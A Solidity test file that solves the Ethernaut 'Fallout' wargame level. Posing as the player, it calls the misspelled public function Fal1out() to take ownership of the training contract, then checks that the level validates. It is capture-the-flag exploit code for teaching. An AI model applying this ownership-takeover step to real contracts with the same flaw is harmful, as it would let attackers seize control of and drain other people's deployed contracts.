// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {DSTest} from "ds-test/test.sol";
import {Fallout} from "ethernaut/contracts/src/levels/Fallout.sol";
import {FalloutFactory} from "ethernaut/contracts/src/levels/FalloutFactory.sol";

interface Vm {
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

contract FalloutTest is DSTest {
    address internal constant VM_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
    Vm internal constant vm = Vm(VM_ADDRESS);

    address public immutable player = address(0xdead);
    FalloutFactory public factory;
    Fallout public level;

    function setUp() public {
        factory = new FalloutFactory();
        level = Fallout(factory.createInstance(player));
    }

    function test_exploit_Fallout() public {
        assert(level.owner() != player);
        vm.startPrank(player);
        level.Fal1out();
        vm.stopPrank();
        assert(factory.validateInstance(payable(address(level)), player));
    }
}
